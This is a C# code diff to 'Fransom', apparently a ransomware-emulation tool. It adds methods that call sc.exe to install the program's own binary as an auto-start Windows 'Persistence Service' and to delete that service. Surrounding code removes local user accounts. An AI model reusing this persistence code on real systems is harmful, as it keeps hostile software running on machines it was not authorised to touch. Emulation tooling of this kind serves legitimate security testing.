@@ -6,6 +6,9 @@ using Microsoft.Win32;
 using Microsoft.Win32.TaskScheduler;
 using System.DirectoryServices.AccountManagement;
 using System.DirectoryServices;
+using static System.Net.Mime.MediaTypeNames;
+using System.Reflection;
+using System.Diagnostics;
 
 namespace Fransom
 {
@@ -109,6 +112,60 @@ namespace Fransom
                 DirectoryEntry user = users.Find(username);
                 users.Remove(user);
                 Logger.WriteLine(String.Format("[+] Removed Local Account with username '{0}'.", username));
+            }
+            catch (Exception e)
+            {
+                Logger.WriteLine("[-] Error: " + e.Message);
+            }
+        }
+
+        public void CreateService()
+        {
+            try
+            {
+                Console.WriteLine("Installing Fransom service");
+                // this will be changed to CreateService eventually
+                string FransomBinary = Assembly.GetEntryAssembly().Location;
+                string DisplayName = "Fraktal Fransom Persistence Service";
+                string ServiceName = "Fransom";
+                Process process = new Process();
+                process.StartInfo.FileName = "sc.exe";
+                process.StartInfo.Arguments = "\\\\. create " + ServiceName + " type= own start= auto" + " displayname= \"" + DisplayName + "\" binpath= " + FransomBinary;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.RedirectStandardError = true;
+                process.Start();
+                string output = process.StandardOutput.ReadToEnd();
+//                Logger.WriteLine(output);
+                string err = process.StandardError.ReadToEnd();
+                Logger.WriteLine(err);
+                process.WaitForExit();
+            }
+            catch (Exception e)
+            {
+                Logger.WriteLine("[-] Error: " + e.Message);
+            }
+        }
+        public void RemoveService()
+        {
+            try
+            {
+                // this will be changed to DeleteService eventually
+                Console.WriteLine("Removing Fransom service");
+                string FransomBinary = Assembly.GetEntryAssembly().Location;
+                string ServiceName = "Fransom";
+                Process process = new Process();
+                process.StartInfo.FileName = "sc.exe";
+                process.StartInfo.Arguments = "\\\\. delete " + ServiceName;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.RedirectStandardError = true;
+                process.Start();
+                string output = process.StandardOutput.ReadToEnd();
+//                Logger.WriteLine(output);
+                string err = process.StandardError.ReadToEnd();
+                Logger.WriteLine(err);
+                process.WaitForExit();
             }
             catch (Exception e)
             {
